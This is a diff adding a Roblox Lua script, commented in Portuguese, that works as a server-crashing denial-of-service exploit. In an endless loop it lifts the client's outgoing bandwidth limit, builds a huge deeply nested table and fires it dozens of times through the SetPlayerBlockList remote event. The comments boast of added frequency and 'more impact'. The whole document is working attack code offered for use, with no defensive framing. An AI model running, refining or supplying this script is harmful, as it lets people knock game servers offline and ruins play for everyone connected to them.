@@ -1,0 +1,44 @@
+-- Script mais potente, use com cautela!
+while wait(0.1) do -- Aumentei a frequência para enviar mais rápido
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+
+    local function getmaxvalue(val)
+        local mainvalueifonetable = 999999 -- Valor aumentado para criar tabelas maiores
+        if type(val) ~= "number" then
+            return nil
+        end
+        local calculateperfectval = (mainvalueifonetable / (val + 1))
+        return calculateperfectval
+    end
+
+    local function bomb(tableincrease, tries)
+        local maintable = {}
+        local spammedtable = {}
+
+        -- Criação de uma tabela aninhada ainda maior
+        table.insert(spammedtable, {})
+        local z = spammedtable[1]
+
+        for i = 1, tableincrease * 2 do -- Aumentei o valor para criar mais camadas
+            local tableins = {}
+            table.insert(z, tableins)
+            z = tableins
+        end
+
+        local calculatemax = getmaxvalue(tableincrease)
+        local maximum = calculatemax or 1999999 -- Máximo ajustado para um valor ainda maior
+
+        -- Preenche a tabela com mais dados
+        for i = 1, maximum do
+            table.insert(maintable, spammedtable)
+        end
+
+        -- Envia para o servidor múltiplas vezes
+        for i = 1, tries * 5 do -- Aumentei o número de tentativas
+            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+        end
+    end
+
+    -- Executa a função com valores ainda mais altos
+    bomb(500, 10) -- Aumentei os valores para mais impacto
+end
